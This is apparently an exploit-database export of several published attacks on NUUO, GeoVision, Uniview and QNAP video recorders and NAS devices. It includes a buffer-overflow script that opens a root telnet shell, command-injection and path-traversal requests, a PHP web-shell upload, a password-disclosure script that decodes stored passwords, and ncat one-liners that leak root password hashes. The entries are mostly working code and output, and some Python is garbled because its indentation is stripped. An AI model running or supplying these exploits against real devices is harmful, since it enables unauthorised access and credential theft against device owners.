data = sock.recv(1024)
sock.close()
return data.find('500') != -1
def check_target(ip, port):
index = requests.get('http://' + ip + ':' + port + ""/upgrade_handle.php?cmd=getcurrentinfo"")
return (index.text.find('<Titan>03.08') != -1 or index.text.find('<Titan>03.07') != -1)
if __name__ == ""__main__"":
if (len(sys.argv) != 3):
print ""Usage: python nvrmini2_enable_telnet.py <ipv4 address> <port>""
sys.exit(1)
ip = sys.argv[1]
port = sys.argv[2]
if int(port) > 65535:
print('[-] Invalid port parameter')
sys.exit(0)
if len(ip.split('.')) != 4:
print('[-] Invalid IP address parameter')
sys.exit(0)
print '[+] Checking for a valid target...'
if (check_target(ip, port) == False):
print('[-] The target is not a NVRMini2 or its using an untested version.')
sys.exit(0)
print '[+] Valid target!'
if (stack_buffer_overflow('mount -t devpts devpts /dev/pts', ip, port) == False):
print('[-] Mount failed')
sys.exit(0)
if (stack_buffer_overflow('/bin/sh -c ""/usr/sbin/telnetd -l /bin/bash -b 0.0.0.0""&', ip, port) == False):
print('[-] telnetd bind failed')
sys.exit(0)
print('[+] Success!')"
2018-07-23,WebApps,Hardware,Berk Dusunur,NUUO NVRmini,'upgrade_handle.php' Remote Command Execution,"# Exploit Title: NUUO NVR Unauthenticated Remote Code Execution
# Exploit Author: Berk Dusunur
# Google Dork: N/A
# Date: 2018-07-21
# Vendor Homepage: http://www.nuuo.com/
# Software Link: http://www.nuuo.com/
# Affected Version: v2016
# Tested on: Parrot OS
# CVE : N/A
# Proof Of Concept","GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27 HTTP/1.1
Host: target:50000
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=7b74657ab949a442c9e440ccf050de1e; lang=en
HTTP/1.1 200 OK
X-Powered-By: PHP/5.6.13
Content-type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Date: Sat, 21 Jul 2018 15:54:09 GMT
Server: lighttpd/1.4.39
upload_tmp_dir=/mtd/block3 root
GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;id;%27 HTTP/1.1
Host: target:5000
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=7b74657ab949a442c9e440ccf050de1e; lang=en
HTTP/1.1 200 OK
X-Powered-By: PHP/5.6.13
Content-type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Date: Sat, 21 Jul 2018 15:54:09 GMT
Server: lighttpd/1.4.39
upload_tmp_dir=/mtd/block3 uid=0(root) gid=0(root)"
2018-07-22,WebApps,Hardware,Berk Dusunur,GeoVision GV-SNVR0811,Directory Traversal,"# Exploit Title: GeoVision GV-SNVR0811 Directory Traversal
# Exploit Author: Berk Dusunur
# Google Dork: N/A
# Type: Hardware
# Date: 2018-07-21
# Vendor Homepage: http://www.geovision.com.tw/product/GV-SNVR0811
# Software Link: http://www.geovision.com.tw/product/GV-SNVR0811
# Affected Version: N/A
# Tested on: Parrot OS
# CVE : N/A
# Proof Of Concept","GET Request
GET ../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Response
HTTP/1.1 200 OK
Server:Cross Web Server
Content-length: 59
Content-type: application/octet-stream
root:$1$$qRPK7m23GJusamGpoGLby/:0:0::/root:/bin/sh"
2018-05-29,WebApps,Hardware,M3@Pandas,NUUO NVRmini2 / NVRsolo,Arbitrary File Upload,"# Exploit Title: NUUO NVRmini2 / NVRsolo Arbitrary File Upload Vulnerability
# Google Dork: intitle:NUUO Network Video Recorder Login
# Date: 2018-05-20
# Exploit Author: M3@Pandas
# Vendor Homepage: http://www.nuuo.com
# Software Link: N/A
# Version: all
# Tested on: PHP Linux
# CVE : CVE-2018-11523
//echo $_FILES['userfile']['type'];
//echo "":"";
//echo $_FILES['userfile']['size'];
//echo "":"";
//echo urldecode($_FILES['userfile']['name']);
//echo "":"";
//echo $_FILES['userfile']['tmp_name'];
//echo "":"";
//echo $_FILES['userfile']['error'];
//echo "":"";","Advisory: NUUO NVRmini2 / NVRsolo Arbitrary File Upload Vulnerability
Author: M3@pandas From DBAppSecurity
Affected Version: All
Vulnerability Description
Recetly, I found an Arbitrary File Upload Vulnerability in 'NUUO NVRmini2' program, NVRmini2 is widely used all over
the world.
Vulnerable cgi: /upload.php
<?php
echo $_FILES['userfile']['name'];
copy($_FILES[""userfile""][""tmp_name""],$_FILES['userfile']['name']);
As the code above, no any filter, so we can upload a php shell directly to the web server.
POC  EXP
1. Upload 'nuuonvr.php' to web root path:
POST /upload.php HTTP/1.1
Host: 192.168.10.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: multipart/form-data; boundary=--------969849961
Content-Length: 162
----------969849961
Content-Disposition: form-data; name=""userfile""; filename=""nuuonvr.php""
?php phpinfo();@unlink(__FILE__);?
----------969849961--
2. Check if the php file is uploaded successfully:
GET http://192.168.10.1/nuuonvr.php
If the page returns phpinfo info, target is vulnerable!"
2017-06-09,WebApps,Hardware,B1t,Uniview NVR,Password Disclosure,"#Uniview NVR remote passwords disclosure
#Author: B1t
# The Uniview NVR web application does not enforce authorizations on the main.cgi file when requesting json data.
# It says that you can do anything without authentication, however you must know the request structure.
# In addition, the users' passwords are both hashed and also stored in a reversible way
# The POC below remotely downloads the device's configuration file, extracts the credentials
# and decodes the reversible password strings using my crafted map
# It is worth mention that when you login, the javascript hashes the password with MD5 and pass the request.
# If the script does retrieve the hash and not the password, you can intercept the request and replace the generated
# MD5 with the one disclosed using this script
# Tested on the following models:
#   NVR304-16E - Software Version B3118P26C00510
#   NVR301-08-P8 - Software Version B3218P26C00512
#=09=09=09=09=09=09and version B3220P11
# Other versions may also be affected
#Usage: python nvr-pwd-disc.py http://Host_or_IP:PORT
# Run example:
# root@k4li:~# python nvr-pwd-disc.py http://192.168.1.5
# Uniview NVR remote passwords disclosure!
# Author: B1t
# [+] Getting model name and software version...
# Model: NVR301-08-P8
# Software Version: B3218P26C00512
# [+] Getting configuration file...
# [+] Number of users found: 4
# [+] Extracting users' hashes and decoding reversible strings:
# User =09|=09 Hash =09|=09 Password
# _________________________________________________
# admin =09|=093b9c687b1f4b9d87ed0fdd6abbf7e33d =09|=09<TRIMMED>
# default =09|=09 =09|=09||||||||||||||||||||
# HAUser =09|=09288b836a37578141fea6527b5e190120 =09|=09123HAUser123[err
# test =09|=0951b2454c681f3205f63b8372096d990b =09|=09AA123pqrstuvwxyz
#  *Note that the users 'default' and 'HAUser' are default and sometimes in=","accessible remotely
import requests
import xml.etree.ElementTree
import sys
print ""\r\nUniview NVR remote passwords disclosure!""
print ""Author: B1t\r\n""
def decode_pass(rev_pass):
pass_dict =3D {'77': '1', '78': '2', '79': '3', '72': '4', '73': '5', '=
74': '6', '75': '7', '68': '8', '69': '9',
'76': '0', '93': '!', '60': '@', '95': '#', '88': '$', '89=
': '%', '34': '^', '90': '&', '86': '*',
'84': '(', '85': ')', '81': '-', '35': '_', '65': '=3D', '=
87': '+', '83': '/', '32': '\\', '0': '|',
'80': ',', '70': ':', '71': ';', '7': '{', '1': '}', '82':=
'.', '67': '?', '64': '<', '66': '>',
'2': '~', '39': '[', '33': ']', '94': '""', '91': ""'"", '28'=
: '`', '61': 'A', '62': 'B', '63': 'C',
'56': 'D', '57': 'E', '58': 'F', '59': 'G', '52': 'H', '53=
': 'I', '54': 'J', '55': 'K', '48': 'L',
'49': 'M', '50': 'N', '51': 'O', '44': 'P', '45': 'Q', '46=
': 'R', '47': 'S', '40': 'T', '41': 'U',
'42': 'V', '43': 'W', '36': 'X', '37': 'Y', '38': 'Z', '29=
': 'a', '30': 'b', '31': 'c', '24': 'd',
'25': 'e', '26': 'f', '27': 'g', '20': 'h', '21': 'i', '22=
': 'j', '23': 'k', '16': 'l', '17': 'm',
'18': 'n', '19': 'o', '12': 'p', '13': 'q', '14': 'r', '15=
': 's', '8': 't', '9': 'u', '10': 'v',
'11': 'w', '4': 'x', '5': 'y', '6': 'z'}
rev_pass =3D rev_pass.split("";"")
pass_len =3D len(rev_pass) - rev_pass.count(""124"")
password =3D """"
for char in rev_pass:
if char !=3D ""124"": password =3D password + pass_dict[char]
return pass_len, password
if len(sys.argv) < 2:
print ""Usage: "" + sys.argv[0] + "" http://HOST_or_IP:PORT\r\n PORT: The =
web interface's port""
print ""\r\nExample: "" + sys.argv[0] + "" http://192.168.1.1:8850""
sys.exit()
elif ""http://"" not in sys.argv[1] and ""https://"" not in sys.argv[1]:
=09print ""Usage: "" + sys.argv[0] + "" http://HOST_or_IP:PORT\r\n PORT: The w=
eb interface's port""
=09sys.exit()
=09
host =3D sys.argv[1]
print ""[+] Getting model name and software version...""
r =3D requests.get(host + '/cgi-bin/main-cgi?json=3D{""cmd"":%20116}')
if r.status_code !=3D 200:
print ""Failed fetching version, got status code: "" + r.status_code
print ""Model: "" + r.text.split('szDevName"":=09""')[1].split('"",')[0]
print ""Software Version: "" + r.text.split('szSoftwareVersion"":=09""')[1].spl=
it('"",')[0]
print ""\r\n[+] Getting configuration file...""
r =3D requests.get(host + ""/cgi-bin/main-cgi?json=3D{%22cmd%22:255,%22szUse=
rName%22:%22%22,%22u32UserLoginHandle%22:8888888888}"")
if r.status_code !=3D 200:
print ""Failed fetching configuration file, response code: "" + r.status_=
code
sys.exit()
root =3D xml.etree.ElementTree.fromstring(r.text)
print ""[+] Number of users found: "" + root.find(""UserCfg"").get(""Num"")
print ""\r\n[+] Extracting users' hashes and decoding reversible strings:""
users =3D root.find(""UserCfg"").getchildren()
print ""\r\nUser \t|\t Hash \t|\t Password""
print ""_________________________________________________""
for user in users:
l, p =3D decode_pass(user.get(""RvsblePass""))
print user.get(""UserName""), ""\t|\t"", user.get(""UserPass""), ""\t|\t"", p
print ""\r\n *Note that the users 'default' and 'HAUser' are default and som=
etimes inaccessible remotely"""
2017-02-01,DoS,Hardware,bashis,QNAP NVR/NAS Devices,Buffer Overflow (PoC),"https://www.qnap.com/en/support/con_show.php?cid=108
https://www.qnap.com/
http://www.qnapsecurity.com/
http://www.fujitsu.com/fts/products/computing/peripheral/accessories/storage/
/* Heap #1 to overwrite the heap wilderness top chunk size */
# export QUERY_STRING=""u=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff""
# ./cgi.cgi
/* Heap #2 to overwrite the heap wilderness top chunk size */
# export QUERY_STRING=""u=admin&p=`for((i=0;i<260;i++));do echo -en ""A"";done`%ff%ff%ff%ff""
# ./cgi.cgi
/* Stack Overflow to overwrite libc_argv[0] address pointer for reading shadow password */
# export QUERY_STRING=""u=admin&pp=`for((i=0;i<4468;i++));do echo -en ""A"";done`%7e%c7%06%08""
# ./cgi.cgi
/* Heap overflow with freed junk chunks, to overwrite next heap chunk header */
/* Controlling: eax, edx, esi */
# export QUERY_STRING=""u=`for((i=0;i<80;i++));do echo -en ""A"";done`%fc%ff%ff%ff%fc%ff%ff%ffCCCC%6c%b1%06%08&QNAP=`for((i=0;i<32;i++));do echo -en ""B"";done`&p=PPPP""
# ./cgi.cgi
/* Combined heap overflow #2 with base64 decoded stack overwrite, to remotely calculate and retrieve shadowed admin (root) password */","Device Model: QNAP VioStor NVR, QNAP NAS, Fujitsu Celvin NAS (May be additional re-branded)
Attack Vector: Remote
Attack Models:
1. Classic Heap Overflows
2. Classic Stack Overflow
3. Heap Feng Shui Overflow
4. ""Heack Combo"" (Heap / Stack Combination) Overflow
[Timeline]
07/01/2017:
QNAP contacted me after my post to Bugtraq 31/12/2016 (http://seclists.org/bugtraq/2017/Jan/5).
Provided additional details, never heard anything back from QNAP.
(The patched FW versions Iâ€™ve found out by myself, no feedback from QNAP)
29/01/2017:
Sent this document to QNAP <security@qnap.com>, asked for feedback and also if they have any objections before publish
31/01/2017:
No reply.
- Frankly speaking - ignorance; next batch will be Full Disclosure without any prior notice nor reply to QNAP (oOoo).
[Vulnerable]
QNAP VioStor NVR: QVR 5.1.x (Patched?)
QNAP NAS: QTS 4.3.2 Beta (Patched?)
QNAP NAS: QTS older than 4.2.3 (build 20170121)
Fujitsu Celvin NAS: older than 4.2.3 (build 20170110)
[Not Vulnerable]
QNAP NAS: QTS >= 4.2.3 (build 20170121)
Fujitsu Celvin NAS: >= 4.2.3 (build 20170110)
[Vendor security alert]
[Vendor URL]
Note: All hardcoded examples below, made with TS-251+ QTS 4.2.2 (Build 20161214)
===[ 1. Classic Heap Overflows ]===
1. Both the tags ""u"" (user) and ""p"" (password) suffer of heap overflow, that alone allows us to overwrite wilderness top chunk size.
2. The tag ""pp"" (sysApp) suffer of stack overflow, that alone allows to us to overwrite libc_argv[0].
Note: Local shown below, but can of course be triggered remote as well
*** glibc detected *** ./cgi.cgi: double free or corruption (out): 0x0806b0d0 ***
*** glibc detected *** ./cgi.cgi: double free or corruption (out): 0x0806b2a0 ***
===[ 2. Classic Stack Overflow ]===
Content-type: text/xml
<?xml version=""1.0"" encoding=""UTF-8"" ?>
<QDocRoot version=""1.0"">
<authPassed><![CDATA[0]]></authPassed></QDocRoot>
*** stack smashing detected ***: $1$$CoERg7ynjYLsj2j4glJ34. terminated
Aborted
As we can see above, the implemented GLIBC heap/stack protections works quite sufficient, pretty much nothing interesting can be achieved.
But, when we start to combining vulnerabilities, flaws and near functions with each other, things starting to get a bit more interesting.
===[ 3. Heap Feng Shui with Heap #1 and #2 Overflow ]===
One of the first functions that runs in the CGI, is CGI_Get_Input(), this function takes all our input to the CGI and allocates memory on the heap for later use with CGI_Find_Parameter(); This allow us to create junk memory chunks more or less wherever we would like to have them, have them freed, and then later have them allocated for our use.
The for() loop with char ""B"" will create used and freed space before ""p"" at heap by CGI_Get_Input();
The upcoming calloc() for ""u"" will use this space, and the content in ""u"" will be copied here and overflow into ""p"":s heap chunk header.
[The abort() happens in <fgetpwent+402>: malloc() from Get_Exact_NAS_User_Name() call, and not in ""p"":s calloc()]
*** glibc detected *** /home/httpd/cgi-bin/cgi.cgi: corrupted double-linked list: 0x0806b154 ***
Below I will demonstrate another interesting combination found while exploring,
that easily can be exploited remotely without credentials and without any prior knowledge of the remote target.
===[ 4. ""Heack Combo"" (Heap / Stack Combination) Overflow ]===
We will here combine the ""GLIBC detected"" abort message in GNU LIBC thatâ€™s triggered by an Heap Overflow, together with base64 encoded request string to cgi.cgi in QNAP devices, where the internal b64_Decode() function will (right after the heap overflow) be called and do an stack overwrite of address pointer for libc_argv[0], with the address we choose, which will allow us to read a string almost anywhere.
In this PoC we are using the address for the heap loaded admin (root) /etc/shadow password, to remotely read this string for displaying instead of the program name.
The critical part is to correctly align the request with the address pointer for libc_argv[0], and below you will find guidance for success.
Notes:
1. Sending 0x00-0xff to the stack will work just fine, since the request for ""p"" will be base64 decoded. (theoretically, we could rewrite the stack as how we would like to have it)
2. Iâ€™m using HTTPS/SSL to have some privacy while fuzzing, only to show some people that HTTPS/SSL donâ€™t make them secure by default. (HTTP works of course too)
3. Right before and after the address pointer for libc_argv[0], we have (harmless?) segfaults in strlen() / getenv() due to reading of invalid addresses.
4. The ""\nHost: Qâ€ is needed with HTTPS/SSL, could be removed when using HTTP, otherwise the PoC sometimes may not work as expected. *sigh*
5. Since the given pattern for reading is static, automated tool are quite easy to develop. (with slightly adjustment of the offset for correctly reading)
6. Fingerprinting is extremely easy with the request: ""GET /cgi-bin/authLogin.cgi HTTP/1.0"" (provides XML list with all relevant details)
7. This PoC will not work with devices who has ASLR enabled for heap. *doh*
Credits:
QNAP, to the combination of heap overflow with base64 decoded stack overwrite, for letting us write where we want to read.
GLIBC, who give us quite vital information to calculate with, that allow us to point our reading correctly, and then reading what we want.
Now to the demonstration.
[==== (1) ====]
[Four and more bytes off below the address pointer for libc_argv[0]]
You should start with fairly low number in the for() loop (around 2000 - 3000 should be fine) and work your way up to the breaking point between #1 and #2.
Note:
In the example we start with 4464 in the for() loop, only to clearly show the breaking point between #1 and #2.
Example:
$ echo -en ""GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4464;i++));do echo -en ""\xff"";done) ; AP=$""\x41\x41\x41\x41""; echo -en ""$QN$AP"" | base64 -w 0` HTTP/1.0\nHost: Q\n\n""  | ncat --ssl 192.168.5.7 443
HTTP/1.1 200 OK
Date: Sun, 08 Jan 2017 11:40:06 GMT
*** glibc detected *** cgi.cgi: free(): invalid next size (normal): 0x0806e508 ***
[==== (2) ====]
[Three or two bytes off below the address pointer for libc_argv[0]]
Note now the below ""*** glibc detected ***"" - it doesnâ€™t write the program name as above in #1, this is very important first step to look for.
Note:
Two bytes off can sporadicly generate segfault, so donâ€™t be fooled to believe you are in #3.
Recommending firstly to exactly find the first breaking point between #1 and #2 (program name).
Example (three off below):
$ echo -en ""GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4465;i++));do echo -en ""\xff"";done) ; AP=$""\x41\x41\x41\x41""; echo -en ""$QN$AP"" | base64 -w 0` HTTP/1.0\nHost: Q\n\n"" | ncat --ssl 192.168.5.7 443
HTTP/1.1 200 OK
Date: Sun, 08 Jan 2017 11:41:12 GMT
*** glibc detected *** : free(): invalid next size (normal): 0x0806e508 ***
Example (two off below):
$ echo -en ""GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4466;i++));do echo -en ""\xff"";done) ; AP=$""\x41\x41\x41\x41""; echo -en ""$QN$AP"" | base64 -w 0` HTTP/1.0\nHost: Q\n\n"" | ncat --ssl 192.168.5.7 443
HTTP/1.1 200 OK
Date: Sun, 08 Jan 2017 11:41:52 GMT
*** glibc detected *** : free(): invalid next size (normal): 0x0806e508 ***
[==== (3) ====]
[One byte off below the address pointer for libc_argv[0]]
Very important step, segfault in strlen() and we need now add one more byte to correctly overwrite the address pointer for libc_argv[0]
Example (one off below):
$ echo -en ""GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4467;i++));do echo -en ""\xff"";done) ; AP=$""\x41\x41\x41\x41""; echo -en ""$QN$AP"" | base64 -w 0` HTTP/1.0\nHost: Q\n\n"" | ncat --ssl 192.168.5.7 443
HTTP/1.1 200 OK
Date: Sun, 08 Jan 2017 11:42:26 GMT
Content-Length: 0
Connection: close
Content-Type: text/plain
[==== (4) ====]
The address we looking for can be calculated from above heap message in #2 (0x0806e508) and subtracted with below offset.
Fixed offset (more or less)
NASX86: 0x16b2
NASARM: 0x1562
NASX86 example:
If we subtract the offset: 0x0806e508 - 0x16b2 = 0x0806ce56; We should directly read the hash. (if not, adjust the reading slightly with the offset)
Example (correctly aligned):
$ echo -en ""GET /cgi-bin/cgi.cgi?u=admin&p=`QNAP=$(for((i=0;i<4468;i++));do echo -en ""\xff"";done) ; PWNED=$""\x56\xce\x06\x08""; echo -en ""$QNAP$PWNED"" | base64 -w 0` HTTP/1.0\nHost: Q\n\n"" | ncat --ssl 192.168.5.7 443
HTTP/1.1 200 OK
Date: Sun, 08 Jan 2017 11:43:08 GMT
*** glibc detected *** $1$$CoERg7ynjYLsj2j4glJ34.: free(): invalid next size (normal): 0x0806e510 ***
[==== (5) ====]
If we added one or more bytes above the address pointer for libc_argv[0], ""400 Bad Request"" will be generated or no output with ""200 OK"" as in #3.
If you donâ€™t get expected results (or not any results at all), you are most probably here.
[One byte off or more above the address pointer for libc_argv[0]]
Example (one or more off above):
$ echo -en ""GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4469;i++));do echo -en ""\xff"";done) ; AP=$""\x56\xce\x06\x08""; echo -en ""$QN$AP"" | base64 -w 0` HTTP/1.0\nHost: Q\n\n"" | ncat --ssl 192.168.5.7 443
HTTP/1.1 400 Bad Request
Date: Sun, 08 Jan 2017 11:45:01 GMT
Server: http server 1.0"
2016-08-06,WebApps,PHP,LiquidWorm,NUUO NVRmini 2 3.0.8,'strong_user.php' Backdoor Remote Shell Access,"Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
Desc: NUUO NVRmini, NVRmini2, Crystal and NVRSolo devices have a hidden PHP script
//foreach($value as $userkey => $uservalue)
//echo ""      User ($userkey) ===> $uservalue "";
//echo ""<br>"";
//ma_getgroupmember('');
//$output = system(""adduser bbb -G poweruser -s /sbin/nologin -D -H; passwd bbb 111111"");
//$output = system(""adduser bbb -G poweruser -s /sbin/nologin -D -H"");
//echo $output . "" kkk <br>"";
//$handle = popen(""/bin/ls"", ""r"");
//$read = fread($handle, 1024);
//echo $read;
//pclose($handle);
#1
#root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::
#2
#3
#root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::
#4
#root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::","﻿
NUUO Backdoor (strong_user.php) Remote Shell Access
Vendor: NUUO Inc.
Product web page: http://www.nuuo.com
Affected version: <=3.0.8 (NE-4160, NT-4040)
functionality. Setup is simple and easy, with automatic port forwarding
settings built in. NVRmini 2 supports POS integration, making this the perfect
solution for small retail chain stores. NVRmini 2 also comes full equipped as
a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
and RAID functions for data protection. Choose NVR and know that your valuable video
data is safe, always.
that when called, a backdoor user is created with poweruser privileges that is able
to read and write files on the affected device. The backdoor user 'bbb' when created
with the password '111111' by visiting 'strong_user.php' script is able to initiate a
secure shell session and further steal and/or destroy sensitive information.
/strong_user.php:
<?php
class ReadPasswd{
private $file;
private $fileData;
private $error;
function __construct($file) {
try{
if (is_file($file))
$this->fileData = file($file);
$this->file = $file;
else
throw new Exception(""Couldn’t open file."");
} catch (Exception $e) {
$this->error[] = $e->getMessage();
public function getAllHTML(){
foreach ($this->fileData as $content)
$temp = explode(':', $content);
$output .= ""<b>Username:  {$temp[0]} </b><br />"";
$output .= ""Validation: {$temp[1]} <br />"";
$output .= ""User Identifier: {$temp[2]} <br />"";
$output .= ""Group Identifier: {$temp[3]} <br />"";
$output .= ""Gecos Field: {$temp[4]} <br />"";
$output .= ""Home Directory: {$temp[5]} <br />"";
$output .= ""Shell: {$temp[6]} <br />"";
$output .= ""<br />"";
return $output;
public function getAllCLI() {
foreach ($this->fileData as $content)
$temp = explode(':', $content);
$output .= ""Username: {$temp[0]} n"";
$output .= ""Validation: {$temp[1]} n"";
$output .= ""User Identifier: {$temp[2]} n"";
$output .= ""Group Identifier: {$temp[3]} n"";
$output .= ""Gecos Field: {$temp[4]} n"";
$output .= ""Home Directory: {$temp[5]} n"";
$output .= ""Shell: {$temp[6]} n"";
$output .= ""n"";
return $output;
public function searchUser($user,$data=0) {
try{
$data = array();
if (is_string($user))
foreach($this->fileData as $line)
$temp = explode(':', $line);
if (in_array($user,$temp))
if ($data) return 1;
$data['username'] = $temp[0];
$data['validation'] = $temp[1];
$data['user_identifier'] = $temp[2];
$data['group_identifier'] = $temp[3];
$data['gecos'] = $temp[4];
$data['home_directory'] = $temp[5];
$data['shell'] = $temp[6];
else
throw new Exception('A search error has occured.');
} catch (Exception $e) {
$this->error[] = $e->getMessage();
return $data;
public function getError() {
return $this->error;
public function deleteUser($user) {
try{
if ($this->searchUser($user,1))
foreach ($this->fileData as $line)
$lines = explode("":"",$line);
if (!in_array($user,$lines))
$final .= $line;
if(!file_put_contents($this->file,$final))
throw new Exception(""Could not delete user."");
else
throw new Exception(""User doesn’t exist."");
} catch (Exception $e) {
echo $this->error[] = $e->getMessage();
echo ""Strong test "";
ma_getuser();
ma_getgroup();
$result = array('users' => array(), 'groups' => array());
echo ""<br>"";
echo $maUser;
echo ""<br>"";
echo $maGroup;
echo ""<br>"";
foreach($maGroup as $key =>$value)
$tmp = array();
$tmp['groupname'] = $maGroup[$key]->strGroupname;
$tmp['members'] = array();
echo ""Group ("" . $key . "") === "" . $maGroup[$key]->strGroupname;
echo ""<br><br>"";
ma_getgroupmember($maGroup[$key]->strGroupname);
foreach ($maGroupmember as $mKey => $mValue)
echo ""      User ($mKey) ===> $mValue "";
echo ""<br>"";
array_push($tmp['members'], $maGroupmember[$mKey]->strUsername);
echo ""<br>"";
echo implode("","", $tmp['members']);
echo ""<br>"";
$tmp['membersStr'] = implode("","", $tmp['members']);
array_push($result['groups'], $tmp);
echo ""<h1> Other </h1>"";
$tmp = array();
$tmp['groupname'] = 'admin';
ma_getgroupmember($tmp['groupname']);
$tmp['members'] = array();
foreach ($maGroupmember as $mKey => $mValue)
array_push($tmp['members'], $maGroupmember[$mKey]->strUsername);
echo $maGroupmember[$mKey]->strUsername . ""<br>"";
$tmp['membersStr'] = implode("","", $tmp['members']);
array_push($result['groups'], $tmp);
echo ""<h1> USER </h1>"";
foreach ( $maUser as $key => $value)
$tmp = array();
$tmp['username'] = $maUser[$key]->strUsername;
$tmp['groups'] = array();
foreach ($result['groups'] as $gKey => $gValue)
if (in_array($tmp['username'], $gValue['members']))
array_push($tmp['groups'], $gValue['groupname']);
$tmp['groupsStr'] = implode("","", $tmp['groups']);
echo $tmp['username'] . ""<br>"";
echo $tmp['groupsStr'] . ""<br>"";
array_push($result['users'], $tmp);
echo ""<h1> Read Passwd </h1>"";
$passclass = new ReadPasswd('/etc/passwd');
echo $passclass->getAllHTML();
echo ""<h1> add user </h1>"";
$output = system(""adduser bbb -G poweruser -D "");
$f = popen (""/usr/bin/passwd bbb"",""r"");
$read = fread($f, 1024);
$out = fwrite($f,""111111\n"");
echo $read . "" read  111 ,,, $out <br>"";
$read = fread($f, 1024);
$out = fwrite($f,""111111\n"");
echo $read . "" read 222 ,,, $out <br>"";
pclose($f);
$descriptorspec = array(
0 => array(""pipe"", ""r""),  // stdin is a pipe that the child will read from
1 => array(""pipe"", ""w"")  // stdout is a pipe that the child will write to
$process = proc_open('/usr/bin/passwd bbb', $descriptorspec, $pipes);
if (is_resource($process))
$read = fread($pipes[1], 1024);
$out = fwrite($pipes[0],""111111\n"");
echo $read . "" read  111 ,,, $out <br>"";
$read = fread($pipes[1], 1024);
$out = fwrite($pipes[0],""111111\n"");
echo $read . "" read  111 ,,, $out <br>"";
fclose($pipes[0]);
fclose($pipes[1]);
proc_close($process);
Tested on: GNU/Linux 3.0.8 (armv7l)
GNU/Linux 2.6.31.8 (armv5tel)
lighttpd/1.4.28
PHP/5.5.3
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2016-5354
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5354.php
14.01.2016
Read of /etc/shadow file before backdoor was enabled:
root@nuuo:~# cat /etc/shadow
root:$1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.:14461:0:99999:7:::
bin:*:14495:0:99999:7:::
daemon:*:14495:0:99999:7:::
adm:*:14495:0:99999:7:::
lp:*:14495:0:99999:7:::
sync:*:14495:0:99999:7:::
shutdown:*:14495:0:99999:7:::
halt:*:14495:0:99999:7:::
mail:*:14495:0:99999:7:::
uucp:*:14495:0:99999:7:::
operator:*:14495:0:99999:7:::
games:*:14495:0:99999:7:::
gopher:*:14495:0:99999:7:::
ftp:*:14495:0:99999:7:::
nobody:*:14495:0:99999:7:::
vcsa:!!:14564::::::
sshd:!!:14564::::::
guest::14564:0:99999:7:::
Issuing GET request to the script:
GET http://10.0.0.17/strong_user.php HTTP/1.1
Read of /etc/shadow file after backdoor was enabled:
root@nuuo:~# cat /etc/shadow
root:$1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.:14461:0:99999:7:::
bin:*:14495:0:99999:7:::
daemon:*:14495:0:99999:7:::
adm:*:14495:0:99999:7:::
lp:*:14495:0:99999:7:::
sync:*:14495:0:99999:7:::
shutdown:*:14495:0:99999:7:::
halt:*:14495:0:99999:7:::
mail:*:14495:0:99999:7:::
uucp:*:14495:0:99999:7:::
operator:*:14495:0:99999:7:::
games:*:14495:0:99999:7:::
gopher:*:14495:0:99999:7:::
ftp:*:14495:0:99999:7:::
nobody:*:14495:0:99999:7:::
vcsa:!!:14564::::::
sshd:!!:14564::::::
guest::14564:0:99999:7:::
bbb:$1$gYfUNAQN$.sn8WpIO5gNoOQeZzSyBI/:16915:0:99999:7:::
The backdoor account is able to read the /etc/shadow file:
login as: bbb
bbb@10.0.0.17's password:
-sh-3.2$ id
Using fallback suid method
uid=1004(bbb) gid=1000(poweruser) groups=1000(poweruser)
-sh-3.2$ cat /etc/shadow
Using fallback suid method
root:$1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.:14461:0:99999:7:::
bin:*:14495:0:99999:7:::
daemon:*:14495:0:99999:7:::
